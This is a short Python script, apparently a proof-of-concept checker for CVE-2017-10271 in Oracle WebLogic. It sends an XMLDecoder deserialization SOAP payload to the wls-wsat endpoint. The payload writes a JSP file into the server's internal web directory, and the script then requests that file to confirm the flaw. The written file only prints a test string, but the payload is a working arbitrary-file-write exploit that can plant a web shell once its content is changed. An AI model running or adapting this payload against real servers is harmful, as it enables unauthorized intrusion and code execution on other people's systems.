import requests
def connect(ip):
    url=f'{ip}/wls-wsat/CoordinatorPortType'
    url2=f'{ip}/bea_wls_internal/e.jsp'
    headers={
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding": "gzip, deflate",
    "DNT": "1",
    "Content-Type": "text/xml",
    "Connection": "close"
}
    data='<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">\n    <soapenv:Header>\n    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">\n    <java><java version="1.4.0" class="java.beans.XMLDecoder">\n    <object class="java.io.PrintWriter"> \n    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/e.jsp</string>\n    <void method="println"><string>\n    <![CDATA[\n<% out.print("test2"); %>\n    ]]>\n    </string>\n    </void>\n    <void method="close"/>\n    </object></java></java>\n    </work:WorkContext>\n    </soapenv:Header>\n    <soapenv:Body/>\n</soapenv:Envelope>'
    requests.post(url=url,headers=headers,data=data)
    res=requests.get(url=url2)
    if 'test2' in res.text:
        print('存在CVE-2017-10271漏洞！')